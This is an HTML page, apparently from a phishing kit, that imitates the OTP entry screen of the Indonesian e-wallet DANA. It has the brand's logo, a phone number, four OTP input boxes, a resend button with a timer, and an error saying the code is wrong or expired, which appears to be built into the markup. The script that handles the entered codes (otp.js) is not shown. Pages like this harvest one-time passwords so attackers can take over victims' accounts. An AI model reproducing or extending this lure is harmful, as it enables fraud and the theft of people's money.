<!-- otp.html -->
<!DOCTYPE html>
<html lang="id">
<head>

<meta charset="UTF-8">

<meta name="viewport"
content="width=device-width, initial-scale=1.0">

<title>OTP DANA</title>

<link rel="stylesheet"
href="otp.css">

</head>
<body>

<div class="container">

    <!-- LOGO -->
    <div class="logo-wrap">

        <img src="assets/logo-danaa.png"
        class="logo">

    </div>

    <!-- TITLE -->
    <div class="title">

        Kode <b>OTP</b>
        telah terkirim ke

    </div>

    <!-- NOMOR -->
    <div class="number-box">

        <div class="flag-box">
        <img
        src="assets/indo.png"
        class="flag">
        </div>

        <span class="kode">
            +62
        </span>

        <span class="nomor">
            822-7697-59061
        </span>

    </div>

    <!-- VIA -->
    <div class="via">

        via

        <span class="wa">

            WhatsApp

        </span>

        /

        <span class="sms">

            SMS

        </span>

    </div>

    <!-- OTP -->
<div class="otp-container">

    <input type="tel" class="otp-box" maxlength="1">
    <input type="tel" class="otp-box" maxlength="1">
    <input type="tel" class="otp-box" maxlength="1">
    <input type="tel" class="otp-box" maxlength="1">

</div>

    <!-- ALERT -->
    <div class="alert-box">

        <div class="alert-title">

            Kode OTP salah atau kadaluarsa

        </div>

        <div class="alert-desc">

            Pastikan Kode OTP yang kamu
            masukan benar dan tidak kadaluarsa

        </div>

    </div>

    <!-- RESEND -->
    <div class="resend-box">

        <button
        class="resend-btn">
           KIRIM ULANG
           </button>


        <div class="timer">

            00:60

        </div>

    </div>

</div>

<!-- LOADING -->
<div class="loading-box"
id="loadingBox">

    <div class="loading-circle">

        <div class="spinner-ring"></div>

        <img src="assets/loading-danaa.png"
        class="loading-logo">

    </div>

    <div class="loading-text">

        Memuat...

    <div class="spinner"></div>

</div>

<script src="otp.js"></script>

</body>
</html>
